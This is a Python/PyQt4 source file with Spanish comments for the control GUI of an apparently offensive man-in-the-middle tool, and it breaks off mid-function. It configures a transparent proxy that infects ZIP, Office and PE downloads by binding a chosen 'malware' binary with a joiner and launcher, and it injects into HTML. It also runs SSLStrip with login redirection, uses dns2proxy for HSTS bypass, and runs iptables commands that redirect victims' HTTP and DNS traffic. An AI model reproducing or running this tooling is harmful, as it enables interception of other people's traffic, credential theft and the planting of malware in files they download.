#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

import sys, subprocess
import json
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import interfaceEncimaDeLaMosca

eliminar_icono = 'images/eliminar.gif'

class MainDialog(QMainWindow,interfaceEncimaDeLaMosca.Ui_MainWindow):
	process_started = False
	default_config_file = 'configuraciones/default/interface_default.json'
	default_html_config_file = 'configuraciones/default/html_default.json'
	default_ooxml_config_file = 'configuraciones/default/ooxml_default.json'
	default_zip_config_file = 'configuraciones/default/zip_default.json'
	default_pe_config_file = 'configuraciones/default/pe_default.json'

	comando = "proxy_transparente.py"
	ZIPFILECONF = '../encimadelamosca/zip_config.json'
	
	ZIPFILECONFTEMP = '/tmp/zip_config_temp.json'
	PEFILECONFTEMP = '/tmp/pe_config_temp.json'
	OOXMLFILECONFTEMP = '/tmp/ooxml_config_temp.json'
	HTMLFILECONFTEMP = '/tmp/html_config_temp.json'
	DNS2PROXYTEMPFILE = '/tmp/dns_hsts_config.json'


	botones = {}
	dirpath = './'

	puerto = 9090


	def __init__(self, parent = None):
		super(MainDialog, self).__init__(parent)
		self.setupUi(self)

		# Relacion de botones y objetos y procedimientos a los que afectan
		self.botones = {
		# Botones para gestion de tablas de configuraciones (ZIP)
			'AddFileZipConfMod' : self.TableZipModFiles,
			'AddFileZipConfAdd' : self.TableZipAddFiles,
		# Botones de carga/guardado de configuraciones (ZIP)
			'ZipLoadButton'		: self.LoadZipConfig,
			'ZipSaveButton'		: self.SaveZipConfig,		
		# Botones para gestion de tablas de configuraciones (DOCX)
			'AddFileDocxConfMod' : self.TableDocxModFiles,
			'AddFileDocxConfAdd' : self.TableDocxAddFiles,
		# Botones para gestion de tablas de configuraciones (XLSX)
			'AddModXlsxButton' : self.TableXlsxModFiles,
			'AddFileXlsxButton' : self.TableXlsxAddFiles,
		# Botones para gestion de tablas de configuraciones (PPTX)
			'AddModPptxButton' : self.TablePptxModFiles,
			'AddFilePptxButton' : self.TablePptxAddFiles,
		# Botones para gestion de tablas de configuraciones (PPSX)
			'AddModPpsxButton' : self.TablePpsxModFiles,
			'AddFilePpsxButton' : self.TablePpsxAddFiles,
		# Botones de carga/guardado de configuraciones (OOXML)
			'OOXMLLoadButton'		: self.LoadOOXMLConfig,
			'OOXMLSaveButton'		: self.SaveOOXMLConfig,
		# Botones de fichero de configuracion (PE)
			'AddCrypterButton'	: self.CrypterText,
			'AddLauncherButton'	: self.LaucherText,
			'AddMontoolButton'	: self.MontoolText,
			'AddOutputButton'	: self.OutputText,
		# Botones de carga/guardado de configuraciones (PE)
			'PeLoadButton'		: self.LoadPeConfig,
			'PeSaveButton'		: self.SavePeConfig,
		# Botones de seleccion (PROXY)
			'iptablesPathButton': self.iptablesPathText,
			'proxyDirButton'	: self.proxyDirText,
			'dns2proxyDirButton': self.dns2proxyDirText,
			'tmpDirText'		: self.tmpDirText,		 
		# Botones de carga/guardado de configuraciones (PROXY)
			'SaveConfProxy'		: self.SaveProxyConfig,
			'LoadConfProxy'		: self.LoadProxyConfig,
		# Botones SSLStrip y HTML
			'AddDomSSLStrip'	: self.TableDomSSLStrip,
			'AddTransSSLStrip'	: self.TableTransSSLStrip,
			'AddTargetsSSLStrip': self.TableTargetsSSLStrip,
			'AddKeywordSSLStrip': self.TableKeywSSLStrip,
			'AddRedirSSLStrip'  : self.TableRedirSSLStrip,
			'AddHTMLChange'		: self.TableHTMLChange,
		# Botones de carga/guardado de configuraciones (HTML y SSLStrip)
			'HTMLLoadButton'		: self.LoadHTMLConfig,
			'HTMLSaveButton'		: self.SaveHTMLConfig,
		# Botones Main
			'SaveLogButton'		: self.SaveLog
		}

		# Definicion de SIGNALs a los botones
		
		# ZIP
		self.ZipTablesButtonConf(self.AddFileZipConfMod, self.AddFileZipConfAdd, self.TableZipModFiles, self.TableZipAddFiles, loadbutton = self.ZipLoadButton, savebutton = self.ZipSaveButton)
		
		# OOXML
		self.ZipTablesButtonConf(self.AddFileDocxConfMod, self.AddFileDocxConfAdd, self.TableDocxModFiles, self.TableDocxAddFiles, loadbutton = self.OOXMLLoadButton, savebutton = self.OOXMLSaveButton)
		self.ZipTablesButtonConf(self.AddModXlsxButton, self.AddFileXlsxButton, self.TableXlsxModFiles, self.TableXlsxAddFiles)
		self.ZipTablesButtonConf(self.AddModPptxButton, self.AddFilePptxButton, self.TablePptxModFiles, self.TablePptxAddFiles)
		self.ZipTablesButtonConf(self.AddModPpsxButton, self.AddFilePpsxButton, self.TablePpsxModFiles, self.TablePpsxAddFiles)
 
		# PE
		self.connect(self.AddCrypterButton, SIGNAL('clicked()'), self.SelectFile2Text)
		self.connect(self.AddLauncherButton, SIGNAL('clicked()'), self.SelectFile2Text)
		self.connect(self.AddMontoolButton, SIGNAL('clicked()'), self.SelectFile2Text)
		self.connect(self.AddOutputButton, SIGNAL('clicked()'), self.SelectFile2Text)
		
		self.connect(self.PeLoadButton, SIGNAL('clicked()'), self.LoadConfig)
		self.connect(self.PeSaveButton, SIGNAL('clicked()'), self.SaveConfig)

		self.CrypterText.installEventFilter(self)
		self.LaucherText.installEventFilter(self)
		self.MontoolText.installEventFilter(self)
		self.OutputText.installEventFilter(self)

		# HTML y SSLStrip
		self.SSLStripTableButtons(self.AddDomSSLStrip    , self.TableDomSSLStrip, loadbutton = self.HTMLLoadButton, savebutton = self.HTMLSaveButton)
		self.SSLStripTableButtons(self.AddTransSSLStrip  , self.TableTransSSLStrip)
		self.SSLStripTableButtons(self.AddTargetsSSLStrip, self.TableTargetsSSLStrip)
		self.SSLStripTableButtons(self.AddKeywordSSLStrip, self.TableKeywSSLStrip)
		self.SSLStripTableButtons(self.AddRedirSSLStrip  , self.TableRedirSSLStrip)
		self.SSLStripTableButtons(self.AddHTMLChange  	 , self.TableHTMLChange)

		self.TableRedirSSLStrip.setColumnWidth(1,100)
		self.TableRedirSSLStrip.setColumnWidth(2,100)
		# self.TableRedirSSLStrip.setColumnWidth(3,120)
		# self.TableRedirSSLStrip.setColumnWidth(3,200)

		# self.TableHTMLChange.setColumnWidth(3,200)
		self.TableHTMLChange.setColumnWidth(2,180)

		# PROXY
		self.connect(self.LoadConfProxy, SIGNAL('clicked()'), self.LoadConfig)
		self.connect(self.SaveConfProxy, SIGNAL('clicked()'), self.SaveConfig)
		
		self.TCPportText.installEventFilter(self)
		self.proxyDirText.installEventFilter(self)
		self.dns2proxyDirText.installEventFilter(self)
		self.iptablesPathText.installEventFilter(self)
		self.tmpDirText.installEventFilter(self)
		self.interfaceText.installEventFilter(self)

		self.connect(self.iptablesPathButton, SIGNAL('clicked()'), self.SelectFile2Text)
		self.connect(self.proxyDirButton, SIGNAL('clicked()'), self.SelectDir2Text)
		self.connect(self.dns2proxyDirButton, SIGNAL('clicked()'), self.SelectDir2Text)
		self.connect(self.tmpDirText, SIGNAL('clicked()'), self.SelectDir2Text)

		# Main process
		self.connect(self.LaunchButton, SIGNAL('clicked()'), self.startStop)
		self.connect(self.SaveLogButton, SIGNAL('clicked()'), self.SaveConfig)
		

		# Proxy Process
		self.process = QProcess(self)
		self.process.readyRead.connect(self.readData)
		self.statusBar().showMessage(self.tr("Proxy parado"))

		# dns2proxy Process
		self.dnsprocess = QProcess(self)
		self.dnsprocess.readyRead.connect(self.readDataDNS)
		# Load default proxy Conf
		try:
			data = open(self.default_config_file,'r').read()
			self.LoadProxyConfig(data)
			data = open(self.default_html_config_file,'r').read()
			self.LoadHTMLConfig(data)
			data = open(self.default_ooxml_config_file,'r').read()
			self.LoadOOXMLConfig(data)
			data = open(self.default_zip_config_file,'r').read()
			self.LoadZipConfig(data)
			data = open(self.default_pe_config_file,'r').read()
			self.LoadPeConfig(data)
		except Exception,e:
			print 'No hay configuracion por defecto'
			pass

		# Get info del sistema
		try:
			id = self.executeShortCommand('id')
			sysinfo = self.executeShortCommand('uname -a')
		except Exception, e:
			id = 'Nivel de usuario desconocido'
			sysinfo = 'Windows??? (De momento solo soportado Linux y Mac OS X)'

		self.InfoSistemaText.setText(sysinfo+'\n'+id)

	def ZipTablesButtonConf(self, button1, button2, table1, table2, loadbutton = None, savebutton = None):
		self.connect(table2, SIGNAL('cellClicked(int, int)'), self.deleteRowClicked)
		self.connect(table1, SIGNAL('cellClicked(int, int)'), self.deleteRowClicked)
		
		self.connect(button1, SIGNAL('clicked()'), self.AddConfRow)
		self.connect(button2, SIGNAL('clicked()'), self.AddConfRow)
		if loadbutton is not None and savebutton is not None:
			self.connect(loadbutton, SIGNAL('clicked()'), self.LoadConfig)
			self.connect(savebutton, SIGNAL('clicked()'), self.SaveConfig)

		table1.verticalHeader().setVisible(True)
		table2.verticalHeader().setVisible(True)
		
		table2.setDragEnabled(True)
		table1.setDragEnabled(True)

		table2.installEventFilter(self)
		table1.installEventFilter(self)

		table2.setColumnWidth(0,35)
		table1.setColumnWidth(0,35)			

		# self.LaunchButton.setIcon(icontest)

	def SSLStripTableButtons(self,button,table, loadbutton = None, savebutton = None):
		self.connect(table, SIGNAL('cellClicked(int, int)'), self.deleteRowClicked)
		self.connect(button, SIGNAL('clicked()'), self.AddConfRow)
		table.verticalHeader().setVisible(True)
		table.setDragEnabled(True)
		table.installEventFilter(self)
		table.setColumnWidth(0,35)
		if loadbutton is not None and savebutton is not None:
			self.connect(loadbutton, SIGNAL('clicked()'), self.LoadConfig)
			self.connect(savebutton, SIGNAL('clicked()'), self.SaveConfig)

	def LoadConfig(self):
		filename = QFileDialog.getOpenFileName(self, 'Selecciona fichero de configuracion', self.dirpath)
		if filename == '':
			return False
		
		button = self.sender()
		name = str(button.objectName())
		try:
			data = open(filename,'r').read()
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		self.botones[name](data)

	def SaveConfig(self):
		filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero donde guardar', self.dirpath)
		if filename == '':
			return False
		
		button = self.sender()
		name = str(button.objectName())

		self.botones[name](filename = filename)

		#self.ProxyOutput = QtGui.QTextBrowser(self.Proxy)

	def AddConfRow(self):
		sender = str(self.sender().objectName())
		tabla = self.botones[sender]
		self.AddRow(tabla, icon = 'images/eliminar.gif')
		tabla.installEventFilter(self)

	# METHOD readData
	# It is for updating the stdout information.
	def readData(self):
		s = str(self.process.readAll())
		self.ProxyOutput.append(s[:s.rfind('\n')])

	def readDataDNS(self):
		s = str(self.dnsprocess.readAll())
		self.DNSOutput.append(s[:s.rfind('\n')])

	def executeShortCommand(self, command):
		child = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
		res = ''
		while True:
			out = child.stdout.read(1)
			if out == '' and child.poll() != None:
				break
			if out != '':
				res += out
		return res

	def startStop(self):
		iptablesPath = str(self.iptablesPathText.toPlainText())
		dns2proxyPath = str(self.dns2proxyDirText.toPlainText())
		if self.process_started:
			if self.iptablesCheckBox.isChecked() and  iptablesPath != '':
				self.ProxyOutput.append('[++] Parando iptables...')
				comando = '%s -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %d' % (iptablesPath,self.puerto)
				self.executeShortCommand(comando)
				if self.launchDNS2Proxy.isChecked() and dns2proxyPath != '' and self.ActivateSSLSTRIP.isChecked() and self.InfectHTML.isChecked():
					comando = '%s -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53' % iptablesPath
					self.executeShortCommand(comando)
			self.LaunchButton.setText("Iniciar Proxy")
			self.process_started = False
			self.process.kill()
			self.statusBar().showMessage(self.tr("Proxy parado"))
			self.ActivarCheckBoxes(True)
			self.ProxyOutput.append('\nParando Proxy....\n')

			if self.launchDNS2Proxy.isChecked() and dns2proxyPath != '':
			    self.dnsprocess.kill()
			    comando = 'kill `ps auxw | grep dns_hsts | grep -v grep | awk  \'{print $2}\'`'
			    self.executeShortCommand(comando)
			    self.DNSOutput.append('Parando DNS2Proxy...\n')
		else:

			comando = self.ComandoOpciones()
			self.ProxyOutput.append('Ejecutando... '+ comando + '\n')
			try:
				self.process.start(comando)
				self.statusBar().showMessage(self.tr("Proxy ejecutandose"))
				self.ActivarCheckBoxes(False)
				self.LaunchButton.setText("Parar Proxy")
				self.process_started = True
				if self.launchDNS2Proxy.isChecked() and dns2proxyPath != '':
					self.SaveHSTSdns2proxy(filename = self.DNS2PROXYTEMPFILE)
					comando = 'sh -c "cd %s && ./dns2proxy.py -t %s "' % (dns2proxyPath, self.DNS2PROXYTEMPFILE)
					self.DNSOutput.append('Ejecutando... '+ comando + '\n')
					self.dnsprocess.start(comando)

				# empezar iptables
				if self.iptablesCheckBox.isChecked() and  iptablesPath != '':
					self.ProxyOutput.append('[++] Ejecutando iptables...')
					comando = 'sysctl net.ipv4.ip_forward=1'
					self.executeShortCommand(comando)
					comando = '%s -A OUTPUT -p icmp -j DROP' % iptablesPath
					self.executeShortCommand(comando)
					comando = '%s -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %d' % (iptablesPath,self.puerto)
					self.executeShortCommand(comando)
					if self.launchDNS2Proxy.isChecked() and dns2proxyPath != '' and self.ActivateSSLSTRIP.isChecked() and self.InfectHTML.isChecked():
						comando = '%s -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53' % iptablesPath
						self.executeShortCommand(comando)

					
			except Exception, e:
				print "Error %s" % Exception, e

	def ComandoOpciones(self):
		comando = str(self.proxyDirText.toPlainText()) + '/' + self.comando + ' -p ' + str(self.puerto)

		if self.InfectZIP.isChecked():
			self.SaveZipConfig(filename = self.ZIPFILECONFTEMP)
			comando += ' -z %s ' % self.ZIPFILECONFTEMP

		if self.InfectEXE.isChecked():
			self.SavePeConfig(filename = self.PEFILECONFTEMP)
			comando += ' -e %s ' % self.PEFILECONFTEMP

		if self.InfectOOXML.isChecked():
			self.SaveOOXMLConfig(filename = self.OOXMLFILECONFTEMP)
			comando += ' -o %s ' % self.OOXMLFILECONFTEMP

		if self.InfectHTML.isChecked():
			self.SaveHTMLConfig(filename = self.HTMLFILECONFTEMP)
			comando += ' -t %s' % self.HTMLFILECONFTEMP
			if self.ActivateSSLSTRIP.isChecked():
				comando += ' -T'

		if not self.ProxySilentMode.isChecked():
			comando += ' -S '

		return comando

	def ActivarCheckBoxes(self, estado):
		self.InfectZIP.setEnabled(estado)
		self.InfectEXE.setEnabled(estado)
		self.InfectOOXML.setEnabled(estado)
		self.ProxySilentMode.setEnabled(estado)
		self.ActivateSSLSTRIP.setEnabled(estado)
		self.InfectHTML.setEnabled(estado)

	def eventFilter(self, source, event):
		if (event.type() == QEvent.DragEnter):
			if event.mimeData().hasUrls or event.mimeData().hasUrls is not None or event.mimeData().text() != '':
				event.accept()
				return True
			else:
				event.ignore()
				return False

		if (event.type() == QEvent.Drop):
			if event.mimeData().hasUrls:
				for url in event.mimeData().urls():
					try:
						item = QTableWidgetItem()
						item.setText(str(url.toLocalFile()))
						# print source.currentRow(), source.currentColumn()
						position = event.pos()
						# Row height = 30 (hay q restarlo a la posicion)
						row = source.rowAt(position.y()-30)
						column = source.columnAt(position.x())
						if row < 0 or column <= 0 :
							self.AddRow(source, icon = eliminar_icono)
							source.setItem(source.rowCount()-1,column, item)
						else:
							source.setItem(row,column, item)
					except Exception, e:
						source.setText(str(url.toLocalFile()))
					
			elif event.mimeData().text() != '':
				# print 'Drop - ', event.mimeData().text()
				try:
					self.AddRow(source, icon = eliminar_icono)
					item = QTableWidgetItem()
					item.setText(event.mimeData().text())
					source.setItem(source.rowCount()-1,source.columnCount()-1, item)
				except:
					source.clear()
					source.setText(event.mimeData().text())
			return True
		else:
			return False

	def AddRow(self,table, icon = None):
		rows = table.rowCount()+1
		table.setRowCount(rows)
		if icon is not None:
			icon = self.AddButtonIcon(eliminar_icono)
			table.setItem(rows-1, 0, icon)

		return rows

	def AddButtonIcon(self,image):
		icon_item = QTableWidgetItem()
		icon_item.setIcon(QIcon(image))
		icon_item.setFlags(Qt.ItemIsEnabled)
		return icon_item

	def deleteRowClicked(self, row, column):
		if column == 0:
			tabla = self.sender()
			tabla.removeRow(row)
		return True

	def clickTest(self):
		self.statusBar().showMessage(self.tr("Click presionado"))
		return True

	def Error(self, err):
		print err
		return False

	def SelectFile2Text(self):
		filename = QFileDialog.getOpenFileName(self, 'Selecciona fichero', './')
		
		button = self.sender()
		name = str(button.objectName())
		item = self.botones[name]
		item.setText(str(filename))
		return True

	def SelectDir2Text(self):
		filename = QFileDialog.getExistingDirectory(self, 'Selecciona directorio', './')
		
		button = self.sender()
		name = str(button.objectName())
		item = self.botones[name]
		item.setText(str(filename))
		return True

	def SaveLog(self, filename = None):
		if filename is None:
			filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero', self.dirpath)

		if filename == '':
			return False
		try:	
			with open(filename,'a') as f:
				data = str(self.ProxyOutput.toPlainText())
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False
		return True

	# Procedimientos de gestion de configuraciones

	def BorrarConfig(self, config = None):
		# TODO: Preguntar
		if config == 'zip':
			for i in reversed(range(self.TableZipAddFiles.rowCount())):
				self.TableZipAddFiles.removeRow(i)

			for i in reversed(range(self.TableZipModFiles.rowCount())):
				self.TableZipModFiles.removeRow(i)

		if config == 'ooxml':
			for table in [self.TableDocxModFiles, self.TableDocxAddFiles, self.TableXlsxModFiles, self.TableXlsxAddFiles, self.TablePptxModFiles, self.TablePptxAddFiles, self.TablePpsxModFiles, self.TablePpsxAddFiles] :
				for i in reversed(range(table.rowCount())):
					table.removeRow(i)


		if config == 'sslstrip':
			for table in [self.TableDomSSLStrip, self.TableTransSSLStrip, self.TableTargetsSSLStrip, self.TableKeywSSLStrip, self.TableRedirSSLStrip, self.TableHTMLChange] :
				for i in reversed(range(table.rowCount())):
					table.removeRow(i)

	def LoadPeConfig(self, data):
		if data.find('"launcher"') == -1 or data.find('"output"') == -1 or data.find('"malware"') == -1 :
			self.Error('Fichero de configuracion no adecuado')
			return False
		try:	
			configuracion = json.loads(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False		

		self.CrypterText.setText(str(configuracion['joiner']))
		self.LaucherText.setText(str(configuracion['launcher']))
		self.MontoolText.setText(str(configuracion['malware']))
		self.OutputText.setText(str(configuracion['output']))
		self.pathMontoolText.setText(str(configuracion['path_malware']))
		self.pathOrigText.setText(str(configuracion['path_original']))
		return True

	def SavePeConfig(self, filename = None):
		configuracion = {}
		configuracion['joiner'] = str(self.CrypterText.toPlainText())
		configuracion['launcher'] = str(self.LaucherText.toPlainText())
		configuracion['malware'] = str(self.MontoolText.toPlainText())
		configuracion['output'] = str(self.OutputText.toPlainText())
		configuracion['path_malware'] = str(self.pathMontoolText.toPlainText())
		configuracion['path_original'] = str(self.pathOrigText.toPlainText())


		if filename is None:
			filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero de configuracion', self.dirpath)

		if filename == '':
			return False

		data = json.dumps(configuracion, sort_keys=True, indent=4)
		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		return True

	def LoadZipConfig(self, data):
		# print data
		if data.find('"zip"') == -1 or data.find('"add"') == -1 or data.find('"mod"') == -1 :
			self.Error('Fichero de configuracion no adecuado')
			return False
		try:	
			configuracion = json.loads(data)['zip']
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		self.BorrarConfig(config = 'zip')

		for fichero in configuracion['add']:
			table = self.TableZipAddFiles 
			self.AddRow(table, icon = eliminar_icono)
			local = QTableWidgetItem()
			local.setText(fichero[0])

			enzip = QTableWidgetItem()
			enzip.setText(fichero[1])

			table.setItem(table.rowCount()-1, 1, enzip)
			table.setItem(table.rowCount()-1, 2, local)

		for fichero in configuracion['mod']:
			table = self.TableZipModFiles 
			self.AddRow(table, icon = eliminar_icono)

			nombre = QTableWidgetItem()
			nombre.setText(fichero['name'])

			extension = QTableWidgetItem()
			extension.setText(fichero['extension'])

			size = QTableWidgetItem()
			size.setText(fichero['size'])

			old = QTableWidgetItem()
			old.setText(fichero['old'])

			new = QTableWidgetItem()
			new.setText(fichero['new'])

			command = QTableWidgetItem()
			command.setText(fichero['command'])

			table.setItem(table.rowCount()-1,1, nombre)
			table.setItem(table.rowCount()-1,2, extension)
			table.setItem(table.rowCount()-1,3, size)
			table.setItem(table.rowCount()-1,4, old)
			table.setItem(table.rowCount()-1,5, new)
			table.setItem(table.rowCount()-1,6, command)

	def getText(self,table, row, column):
		item = table.item(row, column)
		if item is None:
			return ''
		return str(item.text())

	def SaveZipConfig(self, filename = None):
		configuracion = {}
		zip = {}
		mod = [] 
		add = [] 

		table = self.TableZipModFiles
		for row in range(table.rowCount()):
			add_element = {}
			try:
				add_element['name'] = self.getText(table, row, 1)
				add_element['extension'] = self.getText(table, row, 2)
				add_element['size'] = self.getText(table, row, 3)
				add_element['old'] = self.getText(table, row, 4)
				add_element['new'] = self.getText(table, row, 5)
				add_element['command'] = self.getText(table, row, 6)
			except Exception, e:
				self.Error('%s (%s)'% (Exception,e))

			mod.append(add_element)

		table = self.TableZipAddFiles
		for row in range(table.rowCount()):
			local = self.getText(table, row,2)
			enzip = self.getText(table, row,1)
			if local != '' and enzip != '':
				add_element = (local, enzip)
				add.append(add_element)

		zip['mod'] = mod
		zip['add'] = add

		configuracion['zip'] = zip
		data = json.dumps(configuracion, sort_keys=True, indent=4)

		if filename is None:
			filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero de configuracion', self.dirpath)

		if filename == '':
			return False

		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		return True

	def SaveOOXMLConfig(self, filename = None):
		superconfiguracion = {}
		configuracion = {}


		extensiones = {
			'.docx' : (self.TableDocxModFiles, self.TableDocxAddFiles),
			'.xlsx' : (self.TableXlsxModFiles, self.TableXlsxAddFiles),
			'.pptx' : (self.TablePptxModFiles, self.TablePptxAddFiles),
			'.ppsx' : (self.TablePpsxModFiles, self.TablePpsxAddFiles)
		}
		for extension in extensiones:
			# print 'Saving... ', extension
			zip = {}
			mod = [] 
			add = [] 
			table1, table2  = extensiones[extension]
			table = table1
			for row in range(table.rowCount()):
				add_element = {}
				try:
					add_element['name'] = self.getText(table, row, 1)
					add_element['old'] = self.getText(table, row, 2)
					add_element['new'] = self.getText(table, row, 3)
				except Exception, e:
					self.Error('%s (%s)'% (Exception,e))

				mod.append(add_element)

			table = table2
			for row in range(table.rowCount()):
				local = self.getText(table, row,2)
				enzip = self.getText(table, row,1)
				if local != '' and enzip != '':
					add_element = (local, enzip)
					add.append(add_element)

			zip['mod'] = mod
			zip['add'] = add

			configuracion[extension] = zip
			# print configuracion

		data = json.dumps(configuracion, sort_keys=True, indent=4)

		if filename is None:
			filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero de configuracion', self.dirpath)

		if filename == '':
			return False

		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		return True		

	def LoadOOXMLConfig(self, data):
		if data.find('".docx"') == -1 or data.find('".xlsx"') == -1 or data.find('".pptx"') == -1 :
			self.Error('Fichero de configuracion no adecuado')
			return False
		try:	
			superconfiguracion = json.loads(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		self.BorrarConfig(config = 'ooxml')
		extensiones = {
			'.docx' : (self.TableDocxModFiles, self.TableDocxAddFiles),
			'.xlsx' : (self.TableXlsxModFiles, self.TableXlsxAddFiles),
			'.pptx' : (self.TablePptxModFiles, self.TablePptxAddFiles),
			'.ppsx' : (self.TablePpsxModFiles, self.TablePpsxAddFiles)
		}
		for tipo in  extensiones:
			print 'Processing... ',tipo
			configuracion = superconfiguracion[tipo]
			table1, table2 = extensiones[tipo]

			for fichero in configuracion['add']:
				table = table2
				self.AddRow(table, icon = eliminar_icono)
				local = QTableWidgetItem()
				local.setText(fichero[0])

				enzip = QTableWidgetItem()
				enzip.setText(fichero[1])

				table.setItem(table.rowCount()-1, 1, enzip)
				table.setItem(table.rowCount()-1, 2, local)

			for fichero in configuracion['mod']:
				table = table1
				self.AddRow(table, icon = eliminar_icono)

				nombre = QTableWidgetItem()
				nombre.setText(fichero['name'])

				old = QTableWidgetItem()
				old.setText(fichero['old'])

				new = QTableWidgetItem()
				new.setText(fichero['new'])

				table.setItem(table.rowCount()-1,1, nombre)
				table.setItem(table.rowCount()-1,2, old)
				table.setItem(table.rowCount()-1,3, new)

	def LoadProxyConfig(self, data):
		if data.find('"TCPport"') == -1 or data.find('"tmpDir"') == -1 or data.find('"dns2proxyDir"') == -1 :
			self.Error('Fichero de configuracion no adecuado')
			return False
		try:	
			configuracion = json.loads(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False		

		self.TCPportText.setText(str(configuracion['TCPport']))
		self.proxyDirText.setText(str(configuracion['proxyDir']))
		self.dns2proxyDirText.setText(str(configuracion['dns2proxyDir']))
		self.iptablesPathText.setText(str(configuracion['iptablesPath']))
		self.tmpDirText.setText(str(configuracion['tmpDir']))
		self.interfaceText.setText(str(configuracion['interface']))
		self.iptablesCheckBox.setChecked(configuracion['iptables'])
		self.AutoSaveConfigsCheckBox.setChecked(configuracion['AutoSaveConfigs'])
		

		self.InfectZIP.setChecked(configuracion['InfectZIP'])
		self.InfectEXE.setChecked(configuracion['InfectEXE'])
		self.InfectOOXML.setChecked(configuracion['InfectOOXML'])
		self.InfectHTML.setChecked(configuracion['InfectHTML'])
		self.ActivateSSLSTRIP.setChecked(configuracion['ActivateSSLSTRIP'])
		self.ProxySilentMode.setChecked(configuracion['ProxySilentMode'])
		self.launchDNS2Proxy.setChecked(configuracion['launchDNS2Proxy'])
		return True

	def SaveProxyConfig(self,filename = None):

		configuracion = {}
		configuracion['TCPport'] = str(self.TCPportText.toPlainText())
		configuracion['interface'] = str(self.interfaceText.toPlainText())
		configuracion['proxyDir'] = str(self.proxyDirText.toPlainText())
		configuracion['dns2proxyDir'] = str(self.dns2proxyDirText.toPlainText())
		configuracion['iptablesPath'] = str(self.iptablesPathText.toPlainText())
		configuracion['tmpDir'] = str(self.tmpDirText.toPlainText())
		configuracion['launchDNS2Proxy'] = self.launchDNS2Proxy.isChecked()
		configuracion['iptables'] = self.iptablesCheckBox.isChecked()
		configuracion['AutoSaveConfigs'] = self.AutoSaveConfigsCheckBox.isChecked()

		configuracion['InfectZIP'] = self.InfectZIP.isChecked()
		configuracion['InfectEXE'] = self.InfectEXE.isChecked()
		configuracion['InfectOOXML'] = self.InfectOOXML.isChecked()
		configuracion['InfectHTML'] = self.InfectHTML.isChecked()
		configuracion['ActivateSSLSTRIP'] = self.ActivateSSLSTRIP.isChecked()
		configuracion['ProxySilentMode'] = self.ProxySilentMode.isChecked()

		if filename is None:
			filename = QFileDialog.getSaveFileName(self, 'Selecciona fichero de configuracion', self.dirpath)

		if filename == '':
			return False

		data = json.dumps(configuracion, sort_keys=True, indent=4)
		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		return True

	def SaveHTMLConfig(self, filename = None):
		# print data
		configuracion = {}
		mod = []
		sslstrip = {}

		table = self.TableHTMLChange
		for row in range(table.rowCount()):
			add_element = {}
			try:
				add_element['name']     = self.getText(table, row, 1)
				add_element['old']      = self.getText(table, row, 2)
				add_element['new']      = self.getText(table, row, 3)
				add_element['quantity'] = self.getText(table, row, 4)
			except Exception, e:
				self.Error('SaveHTMLConfig: %s (%s)'% (Exception,e))

			mod.append(add_element)

		table = self.TableDomSSLStrip 
		sslstrip['general_dictionary'] = []
		for row in range(table.rowCount()):
			add_element = (self.getText(table, row, 1), self.getText(table, row, 2))
			sslstrip['general_dictionary'].append(add_element)

		table = self.TableTransSSLStrip 
		sslstrip['request2_dictionary'] = []
		for row in range(table.rowCount()):
			add_element = (self.getText(table, row, 1), self.getText(table, row, 2))
			sslstrip['request2_dictionary'].append(add_element)

		table = self.TableTargetsSSLStrip 
		sslstrip['objetivos'] = []
		for row in range(table.rowCount()):
			sslstrip['objetivos'].append(self.getText(table, row, 1))

		table = self.TableKeywSSLStrip 
		sslstrip['keywords'] = []
		for row in range(table.rowCount()):
			sslstrip['keywords'].append(self.getText(table, row, 1))

		table = self.TableRedirSSLStrip 
		sslstrip['redir'] = {}
		for row in range(table.rowCount()):
			datos = {}

			
			dominio = self.getText(table, row, 1)
			loginex = self.getText(table, row, 2)
			uri     = self.getText(table, row, 3)
			redirection = self.getText(table, row, 4)

			datos['uri'] = uri
			datos['redirection'] = redirection
			datos['lookfor'] = loginex
			sslstrip['redir'][dominio] = datos

		sslstrip['redir_prefijo'] = str(self.sslstrip_redir_prefix.toPlainText())
		sslstrip['post_login_redirection'] = self.login_exito_redir.isChecked()

		configuracion['mod'] = mod
		configuracion['sslstrip'] = sslstrip

		data = json.dumps(configuracion, sort_keys=True, indent=4)
		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		return True

	def SaveHSTSdns2proxy(self, filename = None):
		sslstrip = {}
		table = self.TableDomSSLStrip 
		sslstrip['general'] = {}
		for row in range(table.rowCount()):
			sslstrip['general'][self.getText(table, row, 1)]=self.getText(table, row, 2)

		data = json.dumps(sslstrip, sort_keys=True, indent=4)
		try:
			with open(filename,'w') as f:
				f.write(data)
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

	def LoadHTMLConfig(self, data):
		# print data

		try:	
			configuracion = json.loads(data)['sslstrip']
			modificacionesHTML = json.loads(data)['mod']
		except Exception, e:
			self.Error('%s (%s)'% (Exception,e))
			return False

		self.BorrarConfig(config = 'sslstrip')

		for fichero in configuracion['general_dictionary']:
			table = self.TableDomSSLStrip 
